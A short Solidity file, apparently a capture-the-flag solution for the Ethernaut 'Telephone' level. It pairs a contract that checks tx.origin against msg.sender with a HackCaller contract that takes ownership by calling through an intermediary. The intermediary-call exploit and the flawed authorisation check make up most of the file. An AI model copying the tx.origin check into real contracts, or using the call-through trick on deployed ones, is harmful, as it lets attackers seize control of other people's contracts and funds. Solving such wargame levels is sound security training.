// SPDX-License: UNLICENSED
pragma solidity >=0.6.0;
/*
Claim ownership of the contract below to complete this level.

  Things that might help

See the Help page above, section "Beyond the console"
*/

contract HackCaller {
    Telephone private immutable target;

    constructor(address _target){
        target = Telephone(_target);
    }

    function update() external {
        target.changeOwner(msg.sender);
    }
}


contract Telephone {

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if(tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}